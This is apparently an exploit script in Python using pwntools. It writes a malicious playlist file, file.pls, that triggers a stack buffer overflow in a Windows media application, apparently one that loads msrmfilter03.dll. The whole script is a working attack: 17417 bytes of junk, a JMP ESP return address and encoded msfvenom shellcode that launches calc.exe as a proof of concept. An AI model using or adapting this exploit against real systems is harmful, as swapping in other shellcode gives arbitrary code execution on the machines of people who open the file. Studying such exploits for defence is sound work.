#!/usr/bin/python3
from pwn import p32, write

prefix = b"http://"

# !py mona pattern_offset eip
offset = 17417
junk = b"A" * offset

# !py mona jmp -r esp -m msrmfilter03.dll
callesp = p32(0x100371f5)

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode -b '\x00\x09\x0a' -e x86/jmp_call_additive -n 4
shellcode =  b""
shellcode += b"\x91\x4a\x93\xfd\xfc\xbb\x6c\xa7\xb4\x99\xeb"
shellcode += b"\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75"
shellcode += b"\xf7\xc3\xe8\xef\xff\xff\xff\x90\x4f\x36\x99"
shellcode += b"\x68\x90\x57\x13\x8d\xa1\x57\x47\xc6\x92\x67"
shellcode += b"\x03\x8a\x1e\x03\x41\x3e\x94\x61\x4e\x31\x1d"
shellcode += b"\xcf\xa8\x7c\x9e\x7c\x88\x1f\x1c\x7f\xdd\xff"
shellcode += b"\x1d\xb0\x10\xfe\x5a\xad\xd9\x52\x32\xb9\x4c"
shellcode += b"\x42\x37\xf7\x4c\xe9\x0b\x19\xd5\x0e\xdb\x18"
shellcode += b"\xf4\x81\x57\x43\xd6\x20\xbb\xff\x5f\x3a\xd8"
shellcode += b"\x3a\x29\xb1\x2a\xb0\xa8\x13\x63\x39\x06\x5a"
shellcode += b"\x4b\xc8\x56\x9b\x6c\x33\x2d\xd5\x8e\xce\x36"
shellcode += b"\x22\xec\x14\xb2\xb0\x56\xde\x64\x1c\x66\x33"
shellcode += b"\xf2\xd7\x64\xf8\x70\xbf\x68\xff\x55\xb4\x95"
shellcode += b"\x74\x58\x1a\x1c\xce\x7f\xbe\x44\x94\x1e\xe7"
shellcode += b"\x20\x7b\x1e\xf7\x8a\x24\xba\x7c\x26\x30\xb7"
shellcode += b"\xdf\x2d\xc7\x45\x5a\x03\xc7\x55\x64\x34\xa0"
shellcode += b"\x64\xef\xdb\xb7\x78\x3a\x98\x48\x33\x66\x89"
shellcode += b"\xc0\x9a\xf3\x8b\x8c\x1c\x2e\xcf\xa8\x9e\xda"
shellcode += b"\xb0\x4e\xbe\xaf\xb5\x0b\x78\x5c\xc4\x04\xed"
shellcode += b"\x62\x7b\x24\x24\x01\x1a\xb6\xa4\xeb\xb9\x3e"
shellcode += b"\x4e\xf3\x41\xbf\x90\xf3\x41\xbf\x90"

payload = prefix + junk + callesp + shellcode

write("file.pls", payload)
